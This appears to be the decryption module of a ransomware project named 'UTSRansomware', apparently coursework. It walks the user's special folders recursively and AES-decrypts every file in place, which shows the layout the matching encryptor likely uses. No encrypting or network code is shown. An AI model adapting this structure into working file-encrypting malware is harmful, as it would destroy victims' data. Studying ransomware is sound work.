using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;

namespace UTSRansomware
{
    internal class Decryptor
    {

        private byte[] key;
        private byte[] iv;

        // Creates a decryptor from given key and IV
        // This must match the key and IV used to encrypt the files
        public Decryptor() 
        {
            string[] keyAndIV = Utils.GetKeyAndIV();
            this.key = Convert.FromBase64String(keyAndIV[0]);
            this.iv = Convert.FromBase64String(keyAndIV[1]);
        }

        // Loops over special directories and decrypts all files in them
        // Uses Environment.SpecialFolders to get paths of folders
        public void DecryptSpecialDirectories()
        {
            foreach (Environment.SpecialFolder folder in Utils.specialFolders)
            {
                string folderPath = Environment.GetFolderPath(folder);
                if (Directory.Exists(folderPath))
                {
                    /* 
                     * As this just brute force tries every file in these directories it run into a lot of
                     * UnauthorizedAccessException as even when running with admin credentials files can be still
                     * locked or not accessable.
                    */
                    try
                    {
                        DecryptDirectory(folderPath);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Access denied to: {folderPath}. Skipping...");
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                }
            }
        }

        // Decrypts all files in a directory, recursviely calls istelf to decrypt files in sub directories
        private void DecryptDirectory(string parentDirectory)
        {
            string[] filePaths = Directory.GetFiles(parentDirectory);
            string[] directoryPaths = Directory.GetDirectories(parentDirectory);

            // Loops over all subfolders and recursively calls itself
            foreach (string directoryPath in directoryPaths)
            {
                if (!directoryPath.Contains("UTSRansomware"))
                {
                    DecryptDirectory(directoryPath);
                }
            }

            // Using multi threaded processing to try improve speed
            // Don't think this is working properly so will have to fix
            foreach (string filePath in filePaths)
            {
                string fileExtension = Path.GetExtension(filePath);
                if (!string.IsNullOrEmpty(fileExtension))
                {
                    try
                    {
                        DecryptFile(filePath);
                    }

                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine($"Access denied to: {filePath}. Skipping...");
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            }
        }

        // Decrypts a given file
        public void DecryptFile(string encryptedFilePath)
        {
            // Instantiate Aes and configure its settings
            using (Aes aesAlg = Aes.Create())
            {
                string tempFilePath = encryptedFilePath + ".temp";
                aesAlg.Mode = CipherMode.CBC; // CBC mode
                aesAlg.KeySize = 256;         // 256-bit key
                aesAlg.BlockSize = 128;       // 128-bit block size
                aesAlg.IV = iv;               // Initialization Vector
                aesAlg.Key = key;             // Encryption Key

                // Create a decryptor
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Open file streams to read the encrypted file and output the decrypted file
                // Outputs as a temp file that is then used to overwrite encrypted file
                using (FileStream fsEncrypted = new FileStream(encryptedFilePath, FileMode.Open, FileAccess.Read))
                using (FileStream fsDecrypted = new FileStream(tempFilePath, FileMode.OpenOrCreate, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsEncrypted, decryptor, CryptoStreamMode.Read))
                {
                    // Read encrypted file and write decrypted bytes to output file
                    int data;
                    while ((data = cs.ReadByte()) != -1)
                    {
                        fsDecrypted.WriteByte((byte)data);
                    }
                }
                // Deletes original (encrypted) file and moves temp file to original location
                File.Delete(encryptedFilePath);
                File.Move(tempFilePath, encryptedFilePath);
                Console.WriteLine("Decrypted: " + encryptedFilePath);
            }
        }
    }
}
